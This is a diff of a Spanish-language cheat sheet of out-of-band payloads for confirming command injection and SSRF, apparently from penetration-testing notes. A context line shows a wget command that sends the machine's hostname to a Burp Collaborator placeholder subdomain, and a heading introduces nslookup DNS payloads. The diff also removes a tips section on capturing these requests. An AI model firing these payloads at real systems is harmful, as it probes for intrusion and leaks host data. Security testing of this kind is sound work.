@@ -4,6 +4,10 @@
 
 ---
 ---
+
+
+
+
 ## **Payloads usando `nslookup`**
 Estos payloads intentan realizar una consulta DNS hacia un subdominio controlado.  
 ```python
@@ -38,9 +42,3 @@ wget --header="User-Agent: $(hostname)" http://BURP-COLLABORATOR-SUBDOMAIN/
 
 ---
 
-### 💡 **Tips de Uso:**
-- Utiliza servicios como **Burp Collaborator**, **Interact.sh** o tu propio servidor DNS para capturar las solicitudes.  
-- Estos payloads son útiles para identificar ejecución de comandos (RCE) o vulnerabilidades de Server-Side Request Forgery (SSRF).  
-- Modifica los comandos para adaptarlos al entorno que estés probando.  
-
----
